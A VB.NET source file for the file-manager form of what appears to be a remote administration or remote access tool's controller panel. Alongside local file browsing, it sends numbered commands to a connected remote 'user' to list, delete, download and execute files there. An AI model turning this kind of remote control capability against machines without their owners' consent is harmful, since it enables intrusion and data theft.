Imports System.IO
Imports Microsoft.VisualBasic.ApplicationServices

Public Class Filemanager

    Public Currentpath As String = Nothing
    Public CurrentRemotePath As String = Nothing
    Public RenameFolderLocal As Boolean = True
    Public CreateFolderLocal As Boolean = True
    Public RenameFileLocal As Boolean = True

#Region "Control & Events"

#Region "Remote Stuff"

    Private Sub ExecuteFileToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ExecuteFileToolStripMenuItem1.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Executing file...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteData(TextBoxRemoteAdressBar.Text)
            Main.WriteCommand(Main.SelectedUserID & "|35")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Processmanager")
        End Try
    End Sub

    Private Sub ToolStripMenuItem9_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem9.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Getting fileinformation...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteData(TextBoxRemoteAdressBar.Text)
            Main.WriteCommand(Main.SelectedUserID & "|31")
            Waiting.ShowDialog()
            Exit Sub
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Fileinfo")
        End Try
    End Sub


    Private Sub ToolStripMenuItem8_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem8.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Renaming folder...")
        RenameFileLocal = False
        FilemanagerRenameFile.ShowDialog()
    End Sub
    Private Sub ToolStripMenuItem6_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem6.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Downloading file: " & TextBoxRemoteAdressBar.Text)
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try

            Main.WriteData(TextBoxRemoteAdressBar.Text)
            Main.WriteCommand(Main.SelectedUserID & "|68")
            Waiting.LabelLoadingStatus.Text = "Downloading File..."
            Waiting.WaitingDuration = 99999
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Delete File")
        End Try
    End Sub

    Private Sub ToolStripMenuItem7_Click(sender As Object, e As EventArgs)
        MsgBox("Comming soon.", MsgBoxStyle.Exclamation)
    End Sub
    Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem5.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Deleting file...")
        If MessageBox.Show("Are your sure you like to delete " & ListViewRemoteFiles.SelectedItems(0).Text & "?", "Confirm Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) = Windows.Forms.DialogResult.Yes Then
            If Main.ListViewMain.Items.Count > 0 Then
                If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                    Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
            Else
                MsgBox("No Users online.", MsgBoxStyle.Exclamation)
            End If
            Try
                Main.WriteData(TextBoxRemoteAdressBar.Text)
                Main.WriteCommand(Main.SelectedUserID & "|29")
                Waiting.ShowDialog()
            Catch x As Exception
                MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Delete File")
            End Try
        End If
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Opening folder...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteData(TextBoxRemoteAdressBar.Text)
            Main.WriteCommand(Main.SelectedUserID & "|26")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Filemanager")
        End Try
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Renaming folder...")
        RenameFolderLocal = False
        FilemanagerRenameFolder.TextBoxRenameFolder.Text = ListViewRemoteFiles.SelectedItems(0).Text
        FilemanagerRenameFolder.ShowDialog()
    End Sub


    Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Deleting folder...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
            End If
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteData(TextBoxRemoteAdressBar.Text)
            Main.WriteCommand(Main.SelectedUserID & "|25")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Filemanager")
        End Try
    End Sub

    Private Sub ListViewRemoteFiles_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListViewRemoteFiles.MouseDoubleClick
        ButtonRemoteGo.PerformClick()
    End Sub


    Private Sub ContextMenuStripRemote_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStripRemote.Opening
        If ListViewRemoteFiles.SelectedItems.Count > 0 Then
            If ListViewRemoteFiles.SelectedItems(0).SubItems(1).Text.ToString = "-" Then
                e.Cancel = True
            End If
            If Not ListViewRemoteFiles.SelectedItems(0).SubItems(1).Text = "DIR" Then
                ContextMenuStripRemote.Items.Item(0).Visible = False
                ContextMenuStripRemote.Items.Item(1).Visible = False
                ContextMenuStripRemote.Items.Item(2).Visible = False
                ContextMenuStripRemote.Items.Item(4).Visible = True
                ContextMenuStripRemote.Items.Item(5).Visible = True
                ContextMenuStripRemote.Items.Item(6).Visible = True
                ContextMenuStripRemote.Items.Item(7).Visible = True
                ContextMenuStripRemote.Items.Item(8).Visible = True
            Else
                ContextMenuStripRemote.Items.Item(0).Visible = True
                ContextMenuStripRemote.Items.Item(1).Visible = True
                ContextMenuStripRemote.Items.Item(2).Visible = True
                ContextMenuStripRemote.Items.Item(4).Visible = False
                ContextMenuStripRemote.Items.Item(5).Visible = False
                ContextMenuStripRemote.Items.Item(6).Visible = False
                ContextMenuStripRemote.Items.Item(7).Visible = False
                ContextMenuStripRemote.Items.Item(8).Visible = False
            End If
        Else
            e.Cancel = True
        End If
    End Sub
    Private Sub ButtonRemoteGo_Click(sender As Object, e As EventArgs) Handles ButtonRemoteGo.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Listing files/folders...")
        If TextBoxRemoteAdressBar.Text = String.Empty Then
            MsgBox("Select a drive first.", MsgBoxStyle.Exclamation)
            Exit Sub
        End If
        CurrentRemotePath = TextBoxRemoteAdressBar.Text
        ListViewRemoteFiles.Items.Clear()
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteData(TextBoxRemoteAdressBar.Text)
            Main.WriteCommand(Main.SelectedUserID & "|24")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Filemanager")
        End Try
    End Sub
    ' When new Drive gets selected in ComboBox Update AdressBar
    Private Sub ComboBoxRemoteDrives_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBoxRemoteDrives.SelectedIndexChanged
        ListViewRemoteFiles.Items.Clear()
        TextBoxRemoteAdressBar.Text = ComboBoxRemoteDrives.SelectedItem.ToString.Substring(0, 3)
        CurrentRemotePath = ComboBoxRemoteDrives.SelectedItem.ToString.Substring(0, 3)
    End Sub

    ' List all Drives connected to the remote PC and add the Icons to it.
    Private Sub ButtonRefreshRemoteDrives_Click(sender As Object, e As EventArgs) Handles ButtonRefreshRemoteDrives.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Listing remote drives...")
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|23")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Processmanager")
        End Try
    End Sub
#End Region

#Region "Local Stuff"
    Private Sub ExecuteFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteFileToolStripMenuItem.Click
        Try
            Process.Start(TextBoxLocalAdressBar.Text)
        Catch
            MsgBox("Unable to execute File.", MsgBoxStyle.Critical)
        End Try
    End Sub
    Private Sub RenameFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameFileToolStripMenuItem.Click
        RenameFileLocal = True
        FilemanagerRenameFile.TextBoxRenameFile.Text = ListViewLocalFiles.SelectedItems(0).Text
        FilemanagerRenameFile.ShowDialog()
    End Sub

    Private Sub CreateFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateFolderToolStripMenuItem.Click
        CreateFolderLocal = True
        FilemanagerCreateFolder.ShowDialog()
    End Sub

    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Creating new folder...")
        CreateFolderLocal = False
        FilemanagerCreateFolder.ShowDialog()
    End Sub

    Private Sub DeleteFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFileToolStripMenuItem.Click
        If MessageBox.Show("Are your sure you like to delete " & ListViewLocalFiles.SelectedItems(0).Text & "?", "Confirm Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) = Windows.Forms.DialogResult.Yes Then
            Try
                File.Delete(TextBoxLocalAdressBar.Text)
                For Each i As ListViewItem In ListViewLocalFiles.SelectedItems
                    ListViewLocalFiles.Items.Remove(i)
                Next
                MsgBox("File deleted with success.", MsgBoxStyle.Information)
            Catch ex As UnauthorizedAccessException
                MsgBox("Can't delete file. Access is denied.", MsgBoxStyle.Critical, "Delete failed")
            Catch ex As Exception
                MsgBox("Can't delete file.", MsgBoxStyle.Critical, "Delete failed")
            End Try
        End If
    End Sub

    Private Sub RenameFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameFolderToolStripMenuItem.Click

        RenameFolderLocal = True
        FilemanagerRenameFolder.TextBoxRenameFolder.Text = ListViewLocalFiles.SelectedItems(0).Text
        FilemanagerRenameFolder.ShowDialog()
    End Sub

    Private Sub ShowFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ShowFolderToolStripMenuItem.Click
        Try
            Process.Start(TextBoxLocalAdressBar.Text)
        Catch
            MsgBox("Unable to open Folder.", MsgBoxStyle.Critical)
        End Try
    End Sub


    Private Sub DeleteFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFolderToolStripMenuItem.Click
        Try
            Directory.Delete(TextBoxLocalAdressBar.Text, True)
            For Each i As ListViewItem In ListViewLocalFiles.SelectedItems
                ListViewLocalFiles.Items.Remove(i)
            Next
        Catch ex As Exception
            MsgBox("Can not delete this folder.", MsgBoxStyle.Critical)
        End Try
    End Sub
    Private Sub ContextMenuStripFiles_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStripLocal.Opening
        If ListViewLocalFiles.SelectedItems.Count > 0 Then
            If ListViewLocalFiles.SelectedItems(0).SubItems(1).Text.ToString = "-" Then
                e.Cancel = True
            End If
            If Not ListViewLocalFiles.SelectedItems(0).SubItems(1).Text = "DIR" Then
                ContextMenuStripLocal.Items.Item(0).Visible = False
                ContextMenuStripLocal.Items.Item(1).Visible = False
                ContextMenuStripLocal.Items.Item(2).Visible = False
                ContextMenuStripLocal.Items.Item(4).Visible = True
                ContextMenuStripLocal.Items.Item(5).Visible = True
                ContextMenuStripLocal.Items.Item(6).Visible = True
                ContextMenuStripLocal.Items.Item(7).Visible = True
                'ContextMenuStripLocal.Items.Item(7).Visible = True
                'ContextMenuStripLocal.Items.Item(8).Visible = True
            Else
                ContextMenuStripLocal.Items.Item(0).Visible = True
                ContextMenuStripLocal.Items.Item(1).Visible = True
                ContextMenuStripLocal.Items.Item(2).Visible = True
                ContextMenuStripLocal.Items.Item(4).Visible = False
                ContextMenuStripLocal.Items.Item(5).Visible = False
                ContextMenuStripLocal.Items.Item(6).Visible = False
                ContextMenuStripLocal.Items.Item(7).Visible = False
            End If
        Else
            e.Cancel = True
        End If
    End Sub

    Private Sub ListViewLocalFiles_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListViewLocalFiles.SelectedIndexChanged
        Try
            If Not String.IsNullOrEmpty(Path.GetDirectoryName(Currentpath)) AndAlso ListViewLocalFiles.SelectedIndices.Count > 0 AndAlso ListViewLocalFiles.SelectedIndices(0) = 0 Then
                TextBoxLocalAdressBar.Text = Path.GetDirectoryName(Currentpath)
            Else
                If ListViewLocalFiles.SelectedItems.Count > 0 Then
                    TextBoxLocalAdressBar.Text = Path.Combine(Currentpath, ListViewLocalFiles.SelectedItems(0).Text)
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.ToString) 'lol ?
        End Try
    End Sub

    Private Sub ListViewLocalFiles_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListViewLocalFiles.MouseDoubleClick
        ButtonLocalGo.PerformClick()
    End Sub

    Private Sub ListViewLocalFiles_KeyDown(sender As Object, e As KeyEventArgs) Handles ListViewLocalFiles.KeyDown
        If e.KeyCode = Keys.Enter Then
            ButtonLocalGo.PerformClick()
        End If
    End Sub


    ' Load Files Folders Button for Remote PC.
    Private Sub ButtonLocalGo_Click(sender As Object, e As EventArgs) Handles ButtonLocalGo.Click
        If TextBoxLocalAdressBar.Text = String.Empty Then
            MsgBox("Select a drive first.", MsgBoxStyle.Exclamation)
            Exit Sub
        End If
        Currentpath = TextBoxLocalAdressBar.Text
        ListViewLocalFiles.Items.Clear()
        If Not String.IsNullOrEmpty(Path.GetDirectoryName(Currentpath)) Then
            With ListViewLocalFiles.Items.Add("..", 0)
                .SubItems.Add("-")
                .SubItems.Add("-")
            End With
            'Else
            '    Exit Sub
        End If

        LoadDirectories(Currentpath)
        LoadFiles(Currentpath)
    End Sub

    ' When new Drive gets selected in ComboBox Update AdressBar
    Private Sub ComboBoxLocalDrives_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBoxLocalDrives.SelectedIndexChanged
        ListViewLocalFiles.Items.Clear()
        TextBoxLocalAdressBar.Text = ComboBoxLocalDrives.SelectedItem.ToString.Substring(0, 3)
        Currentpath = ComboBoxLocalDrives.SelectedItem.ToString.Substring(0, 3)
    End Sub

    ' List all Drives connected to the local PC and add the Icons to it.
    Private Sub ButtonRefreshLocalDrives_Click(sender As Object, e As EventArgs) Handles ButtonRefreshLocalDrives.Click
        ComboBoxLocalDrives.Items.Clear()
        Dim Drives As String = Nothing
        For Each Drive In DriveInfo.GetDrives
            If Drive.DriveType = DriveType.Fixed Then
                Me.ComboBoxLocalDrives.Items.Add(New ImageComboItem(Drive.ToString & " - " & Drive.DriveType.ToString, New Font("Microsoft Sans Serif", 8), Color.Black, 0))
            ElseIf Drive.DriveType = DriveType.CDRom Then
                Me.ComboBoxLocalDrives.Items.Add(New ImageComboItem(Drive.ToString & " - " & Drive.DriveType.ToString, New Font("Microsoft Sans Serif", 8), Color.Black, 1))
            ElseIf Drive.DriveType = DriveType.Network Then
                Me.ComboBoxLocalDrives.Items.Add(New ImageComboItem(Drive.ToString & " - " & Drive.DriveType.ToString, New Font("Microsoft Sans Serif", 8), Color.Black, 2))
            ElseIf Drive.DriveType = DriveType.Removable Then
                Me.ComboBoxLocalDrives.Items.Add(New ImageComboItem(Drive.ToString & " - " & Drive.DriveType.ToString, New Font("Microsoft Sans Serif", 8), Color.Black, 4))
            Else
                Me.ComboBoxLocalDrives.Items.Add(New ImageComboItem(Drive.ToString & " - " & Drive.DriveType.ToString, New Font("Microsoft Sans Serif", 8), Color.Black, 3))
            End If
        Next
        MsgBox("Drives recieved with success.", MsgBoxStyle.Information, "Success")
    End Sub


#End Region

#End Region

#Region "Data Managing"

#Region "Formatting"


    Private Function GetFileType(ByVal FileName As String) As String
        Try
            GetFileType = ""
            Dim extensionName As String = CStr(My.Computer.Registry.GetValue("HKEY_CLASSES_ROOT\" & FileName.Substring(FileName.LastIndexOf(".")), "", FileName.Substring(FileName.LastIndexOf("."))))
            GetFileType = CStr(My.Computer.Registry.GetValue("HKEY_CLASSES_ROOT\" & extensionName, "", FileName.Substring(FileName.LastIndexOf("."))))
        Catch
            GetFileType = "File"
        End Try
        Return GetFileType
    End Function


    Private Function ExtensionIcon(ByVal Ext As String) As Integer
        Dim Executabletypes() As String = {".exe", ".pif", ".scr"}
        Dim Audiotypes() As String = {".mp3", ".aac", ".wav", ".aiff"}
        Dim Videotype() As String = {".mov", ".wmv", ".avi", ".mp4", ".flv", ".mpg", ".3gp", ".h264", ".m4e", ".mkv", ".swf"}
        Dim Imagetypes() As String = {".jpg", ".bmp", ".gif", ".png", ".ico", ".tiff", ".jpeg", ".tif"}
        Dim Webtypes() As String = {".php", ".html", ".json", ".asp", ".aspx", ".css", ".url"}
        Dim Systemfiles() As String = {".sys", ".dll"}
        Dim Settingstypes() As String = {".ini", ".log", ".cfg", ".set", ".xml"}
        Dim Textfiles() As String = {".txt", ".dat"}
        Dim Shelltypes() As String = {".bat", ".dos"}
        Dim RegTypes() As String = {".reg"}
        Dim Helptypes() As String = {".chm"}
        Dim Archievetypes() As String = {".zip", ".rar", ".cab", ".7z", ".tar", ".gz"}

        If Executabletypes.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 6
        ElseIf Audiotypes.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 7
        ElseIf Videotype.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 9
        ElseIf Imagetypes.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 8
        ElseIf Webtypes.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 4
        ElseIf Systemfiles.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 10
        ElseIf Settingstypes.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 3
        ElseIf Textfiles.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 2
        ElseIf Shelltypes.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 5
        ElseIf RegTypes.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 11
        ElseIf Archievetypes.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 12
        ElseIf Helptypes.Contains(Ext, StringComparer.CurrentCultureIgnoreCase) Then
            Return 13
        Else
            Return 1
        End If
    End Function


    Private Function checkIfValueIsDecimal(ByVal value As String) As String
        Dim result As String
        If value.Contains(",") Then : result = CDbl(value).ToString("###.##")
        Else : result = CDbl(value).ToString("###.00") : End If
        Return result
    End Function

    Private Function roundObjectSize(ByVal ObjectSize As String) As String
        Dim oneByte As Integer = 1
        Dim kiloByte As Integer = 1024
        Dim megaByte As Integer = 1048576
        Dim gigaByte As Integer = 1073741824
        Dim terraByte As Long = 1099511627776
        Dim pettaByte As Long = 1125899906842624

        Select Case CLng(ObjectSize)
            Case 0 To kiloByte - 1
                If (CDbl(checkIfValueIsDecimal(CStr(CDec(ObjectSize) / oneByte))) >= 1000) = False Then
                    ObjectSize = CStr(CInt(ObjectSize) / 1) + " Bytes"
                Else : ObjectSize = "1,00 KB" : End If

            Case kiloByte To megaByte - 1
                If (CDbl(checkIfValueIsDecimal(CStr(CDec(ObjectSize) / kiloByte))) >= 1000) = False Then
                    ObjectSize = checkIfValueIsDecimal(CStr(CDec(ObjectSize) / kiloByte)) + " KB"
                Else : ObjectSize = "1,00 MB" : End If

            Case megaByte To gigaByte - 1
                If (CDbl(checkIfValueIsDecimal(CStr(CDec(ObjectSize) / megaByte))) >= 1000) = False Then
                    ObjectSize = checkIfValueIsDecimal(CStr(CDec(ObjectSize) / megaByte)) + " MB"
                Else : ObjectSize = "1,00 GB" : End If

            Case gigaByte To terraByte - 1
                If (CDbl(checkIfValueIsDecimal(CStr(CDec(ObjectSize) / gigaByte))) >= 1000) = False Then
                    ObjectSize = checkIfValueIsDecimal(CStr(CDec(ObjectSize) / gigaByte)) + " GB"
                Else : ObjectSize = "1,00 TB" : End If

            Case terraByte To pettaByte - 1
                If (CDbl(checkIfValueIsDecimal(CStr(CDec(ObjectSize) / terraByte))) >= 1000) = False Then
                    ObjectSize = checkIfValueIsDecimal(CStr(CDec(ObjectSize) / terraByte)) + " TB"
                Else : ObjectSize = "1,00 PB" : End If
        End Select
        Return ObjectSize
    End Function
#End Region

#Region "Local Data Managing"






    Private Sub GetFileinformationToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GetFileinformationToolStripMenuItem.Click
        Dim SelectedFile As String = TextBoxLocalAdressBar.Text
        Dim file As New FileInfo(SelectedFile)
        Dim sizeInBytes As Long = file.Length
        Dim info As String = Nothing
        Try
            info = FileVersionInfo.GetVersionInfo(SelectedFile).FileDescription.ToString
        Catch
            info = "None"
        End Try
        FilemanagerFileinfo.TextBoxFilename.Text = Path.GetFileName(SelectedFile)
        FilemanagerFileinfo.TextBoxFileType.Text = Path.GetFileName(GetFileType(SelectedFile))
        FilemanagerFileinfo.TextBoxLocation.Text = Path.GetFullPath(SelectedFile)
        FilemanagerFileinfo.TextBoxFileDescription.Text = info
        FilemanagerFileinfo.LabelFilesize.Text = roundObjectSize(CStr(sizeInBytes))
        FilemanagerFileinfo.LabelCreationDate.Text = CStr(file.CreationTime.Date)
        Dim attributes As FileAttributes = System.IO.File.GetAttributes(SelectedFile)
        If (attributes And FileAttributes.Hidden) = FileAttributes.Hidden Then
            FilemanagerFileinfo.CheckBoxHidden.Checked = True
        Else
            FilemanagerFileinfo.CheckBoxHidden.Checked = False
        End If
        If (attributes And FileAttributes.System) = FileAttributes.System Then
            FilemanagerFileinfo.CheckBoxSystem.Checked = True
        Else
            FilemanagerFileinfo.CheckBoxSystem.Checked = False
        End If
        If (attributes And FileAttributes.ReadOnly) = FileAttributes.ReadOnly Then
            FilemanagerFileinfo.CheckBoxReadonly.Checked = True
        Else
            FilemanagerFileinfo.CheckBoxReadonly.Checked = False
        End If
        If (attributes And FileAttributes.Temporary) = FileAttributes.Temporary Then
            FilemanagerFileinfo.CheckBoxTemporary.Checked = True
        Else
            FilemanagerFileinfo.CheckBoxTemporary.Checked = False
        End If
        FilemanagerFileinfo.PictureBox1.Image = System.Drawing.Icon.ExtractAssociatedIcon(SelectedFile).ToBitmap


        FilemanagerFileinfo.ShowDialog()
    End Sub

    Public Function StripPath(ByVal FullPath As String) As String
        Try
            Return FullPath.Substring(FullPath.LastIndexOf("\") + 1)
        Catch
            Return ""
        End Try
    End Function

    Private Sub LoadDirectories(ByVal Path As String)
        Try
            For Each Folder In Directory.GetDirectories(Path)
                With ListViewLocalFiles.Items.Add(StripPath(Folder.ToString))
                    .ImageIndex = 0
                    .SubItems.Add("DIR")
                    .SubItems.Add(Directory.GetLastAccessTime(Folder.ToString).Day & "/" & Directory.GetLastAccessTime(Folder.ToString).Month & "/" & Directory.GetLastAccessTime(Folder.ToString).Year)
                End With
            Next
        Catch ex As UnauthorizedAccessException
            MsgBox("Access is denied.", MsgBoxStyle.Critical, "Failed")
        Catch ex As Exception
            Exit Sub
        End Try
    End Sub


    Private Sub LoadFiles(ByVal Path As String)
        Try
            For Each file In Directory.GetFiles(Path)
                With ListViewLocalFiles.Items.Add(StripPath(file.ToString))
                    If file.LastIndexOf(".") > -1 Then
                        .ImageIndex = ExtensionIcon(file.Substring(file.LastIndexOf(".")))
                    Else
                        .ImageIndex = 1
                    End If
                    Dim filesize As New FileInfo(file)
                    Dim sizeInBytes As Long = filesize.Length
                    .SubItems.Add(roundObjectSize(CStr(sizeInBytes)))
                    .SubItems.Add(Directory.GetLastAccessTime(file.ToString).Day & "/" & Directory.GetLastAccessTime(file.ToString).Month & "/" & Directory.GetLastAccessTime(file.ToString).Year)
                End With
            Next
        Catch ex As UnauthorizedAccessException
            MsgBox("Access is denied.", MsgBoxStyle.Critical, "Failed")
        Catch ex As Exception
            Exit Sub
        End Try
    End Sub

#End Region

#Region "Remote Data Managing"
    Public Sub SplitDrives(ByVal DriveString As String)
        ComboBoxRemoteDrives.Items.Clear()
        Me.ComboBoxRemoteDrives.ImageList = Me.ImageListDrives
        Dim Drives() As String = Split(DriveString, "|||")
        For Each item In Drives
            If item.ToString.EndsWith("Fixed") Then
                Me.ComboBoxRemoteDrives.Items.Add(New ImageComboItem(item, New Font("Microsoft Sans Serif", 8), Color.Black, 0))
            ElseIf item.ToString.EndsWith("CDRom") Then
                Me.ComboBoxRemoteDrives.Items.Add(New ImageComboItem(item, New Font("Microsoft Sans Serif", 8), Color.Black, 1))
            ElseIf item.ToString.EndsWith("Network") Then
                Me.ComboBoxRemoteDrives.Items.Add(New ImageComboItem(item, New Font("Microsoft Sans Serif", 8), Color.Black, 2))
            ElseIf item.ToString.EndsWith("Removable") Then
                Me.ComboBoxRemoteDrives.Items.Add(New ImageComboItem(item, New Font("Microsoft Sans Serif", 8), Color.Black, 4))
            Else
                Me.ComboBoxRemoteDrives.Items.Add(New ImageComboItem(item, New Font("Microsoft Sans Serif", 8), Color.Black, 3))
            End If
        Next
    End Sub

    Public Sub FormateFilesFolders(ByVal Data As String)
        Try
            Dim NewData() As String = Split(Data, "|||||")
            Dim Folders() As String = Nothing
            Dim Files() As String = Nothing
            Folders = Split(NewData(0), "||||")
            If Not NewData(0).Length <= 4 Then

                For x As Integer = 0 To Folders.Length - 1

                    Dim FormattedFolder() As String = Folders(x).Split("|||".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)
                    If FormattedFolder.Length > 0 Then
                        With ListViewRemoteFiles.Items.Add(FormattedFolder(0))
                            .ImageIndex = 0
                            .SubItems.Add("DIR")
                            .SubItems.Add(FormattedFolder(1))
                        End With
                    End If
                Next
            End If

            Files = Split(NewData(1), "||||")
            If Not NewData(1).Length <= 4 Then

                For i As Integer = 0 To Files.Length - 1

                    Dim FormattedFile() As String = Files(i).Split("|||".ToCharArray(), StringSplitOptions.RemoveEmptyEntries)
                    If FormattedFile.Length > 0 Then
                        With ListViewRemoteFiles.Items.Add(FormattedFile(0))
                            If FormattedFile(0).LastIndexOf(".") > -1 Then
                                .ImageIndex = ExtensionIcon(FormattedFile(0).Substring(FormattedFile(0).LastIndexOf(".")))
                            Else
                                .ImageIndex = 1
                            End If
                            .SubItems.Add(FormattedFile(1))
                            .SubItems.Add(FormattedFile(2))
                        End With
                    End If
                Next
            End If
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Exclamation, "Filemanager")
        End Try



    End Sub

    Private Sub ListViewRemoteFiles_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListViewRemoteFiles.SelectedIndexChanged
        Try
            If Not String.IsNullOrEmpty(Path.GetDirectoryName(CurrentRemotePath)) AndAlso ListViewRemoteFiles.SelectedIndices.Count > 0 AndAlso ListViewRemoteFiles.SelectedIndices(0) = 0 Then
                TextBoxRemoteAdressBar.Text = Path.GetDirectoryName(CurrentRemotePath)
            Else
                If ListViewRemoteFiles.SelectedItems.Count > 0 Then
                    TextBoxRemoteAdressBar.Text = Path.Combine(CurrentRemotePath, ListViewRemoteFiles.SelectedItems(0).Text)
                    'yeah I know, but I'm just trying to make it so you can still use that method.
                End If
            End If
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
    End Sub


#End Region

#End Region


    Private Sub Filemanager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        TextBoxLocalAdressBar.Text = String.Empty
        TextBoxRemoteAdressBar.Text = String.Empty
        ListViewLocalFiles.Items.Clear()
        ListViewRemoteFiles.Items.Clear()
        ComboBoxLocalDrives.Items.Clear()
        ComboBoxRemoteDrives.Items.Clear()
    End Sub

End Class